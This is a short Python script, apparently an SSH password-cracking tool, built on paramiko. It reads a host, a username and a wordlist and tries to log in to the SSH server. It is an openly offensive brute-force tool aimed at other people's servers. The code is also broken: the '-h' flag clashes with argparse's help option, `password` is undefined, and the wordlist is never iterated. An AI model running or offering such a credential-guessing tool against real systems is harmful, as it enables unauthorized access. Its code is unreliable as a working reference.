import paramiko
import argparse




parser = argparse.ArgumentParser(description="Basic SSH Cracker")

parser.add_argument("-h","--host",required=True,type=str,help="Enter the hostname")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the username")
parser.add_argument("-w","--wordlist",type=str,required=True,help="Enter the path to wordlist")

args = parser.parse_args()

host = args.host
user = args.user
wordlist = args.wordlist

words = []



def words(wordlist):
    with open(wordlist , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
        






client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    client.connect(hostname=host, username=user , password=password, timeout=3)
    print(f"the connection was successful with {host}")

except Exception as e:
    print(f" the connnection was failed with {host}")